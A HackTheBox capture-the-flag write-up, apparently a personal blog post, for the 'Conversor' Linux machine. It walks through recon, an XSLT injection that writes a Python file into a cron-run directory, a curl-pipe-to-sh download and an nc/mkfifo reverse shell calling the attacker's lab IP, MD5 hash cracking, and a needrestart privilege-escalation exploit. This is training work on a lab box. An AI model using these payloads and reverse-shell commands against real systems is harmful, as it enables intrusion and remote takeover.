---
title: "HTB: Conversor"
description: "A Linux Medium built around a file conversion web app. XSLT injection lets you write files to a cron-watched directory, and a vulnerable needrestart version gets you to root."
author: "Chaelsoo"
pubDate: 2026-02-13
draft: false
tags: ["htb", "linux", "cron"]
---

Conversor is a Linux Medium that gives you the source code upfront. That's not a gift so much as a heads up. You're expected to actually read it. The machine is built around a file conversion web app, and the foothold hinges on understanding what the app does under the hood before you can abuse it.

## Recon

Standard nmap scan. Two ports open, everything else closed or filtered.

```
┌──(kanyo㉿GIGABYTE)-[~]
└─$ nmap -T4 -sV -sC 10.129.238.31
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-13 14:12 +0100
Nmap scan report for 10.129.238.31
Host is up (0.15s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp   open     http           Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
1083/tcp filtered ansoft-lm-1
2260/tcp filtered apc-2260
3918/tcp filtered pktcablemmcops
5718/tcp filtered dpm
7025/tcp filtered vmsvc-2
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 80 redirects to `conversor.htb`, so add that to `/etc/hosts` and move on. The web app is a file converter: you upload something, it spits back a transformed version. There's a file upload input on the main page. That's your surface right there.

Since the source code is provided, I started there instead of poking the UI blindly. When a box gives you the code, read it. Skipping it is just wasting your own time.

## Finding the Cron

Buried in `install.md` was this line:

```
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

Every Python file dropped into `/var/www/conversor.htb/scripts/` gets executed by `www-data` every minute. That's the whole foothold right there, once I figured out how to write a file to that path.

The question was: does the app give me a way to write arbitrary files? Turns out it does.

## XSLT Injection

The app accepts XML paired with an XSLT stylesheet. XSLT is a templating language for transforming XML, normally harmless. But some XSLT processors support extension elements that let you do things like write to the filesystem. If there are no restrictions on what's in the stylesheet, that's a problem.

The `exsl:document` extension is the one you want here. It writes output to a file path you specify. I used it to drop a Python reverse shell into the cron directory:

```xml
<xsl:stylesheet
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exploit="http://exslt.org/common"
    extension-element-prefixes="exploit"
    version="1.0">
<xsl:template match="/">
<exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl 10.10.14.153:9000/revshell.sh|sh")
</exploit:document>
</xsl:template>
</xsl:stylesheet>
```

The Python file just curls a shell script I'm hosting and pipes it to `sh`. Simple, and avoids dealing with escaping issues inside the XSLT.

The reverse shell itself:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.153 4444 >/tmp/f
```

I served that as `revshell.sh` with a quick Python HTTP server, set up a listener on 4444, uploaded the XSLT, and waited.

```bash
python3 -m http.server 9000
nc -lvnp 4444
```

Sixty seconds later, the cron fires and I've got a shell as `www-data`.

`TIP:` The `* * * * *` schedule means one minute max wait. If you're not getting a shell after two minutes, something is wrong. Check your IP, your listener, and whether the file actually landed in the right directory.

## Lateral Movement

Once inside, I started poking around the web root. Found a `user.db` sitting in the site directory. SQLite databases in web app directories are always worth checking. Devs leave them in places they shouldn't.

```bash
sqlite3 user.db
.tables
select * from users;
```

There's a user called `fismathack` with an MD5 hash. MD5 is weak enough that John cracks it fast with rockyou:

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Password comes back as `Keepmesafeandwarm`. That name and that password in the same place is funny in a sad way.

SSH in as `fismathack`, got the user flag.

## Privelege Escalation

First thing I do on any Linux box after getting a user: check the kernel, check installed packages, run `sudo -l`. Nothing useful from sudo here, so I went looking at software versions.

```bash
dpkg -l | grep needrestart
```

`needrestart` 3.7 is installed. If you haven't come across it before: needrestart is a utility that checks whether services need to be restarted after an update. It runs with elevated privileges and versions before 3.8 are vulnerable to CVE-2024-48990.

The exploit lets an attacker influence the `PYTHONPATH` environment variable during execution, which gets picked up when needrestart spawns a Python interpreter. From there you can load a malicious module as root.

Running the public PoC:

```bash
sudo /usr/sbin/needrestart -r a
```

This drops a SUID root binary at `/tmp/poc`.

```bash
/tmp/poc -p
```

Got the root shell, grabbed the flag.

## What Made This Click

The cron job was the thing I almost missed. It's in `install.md`, not in any config file you'd normally check during enumeration. This is why reading provided source code cover to cover matters. The foothold wasn't in the app's main functionality, it was in a side note about how the app was set up.

The XSLT injection is a technique I hadn't used before this machine. The key insight is that XSLT is turing-complete and some processors let you interact with the filesystem through extension elements. If a web app lets you control XSLT input with no sanitization, you can often write files wherever the server process has permission to write.

`TIP:` When you get source code on a box, grep for cron, cronjob, and schedule before you touch the app. Scheduled tasks are often where the real attack surface hides.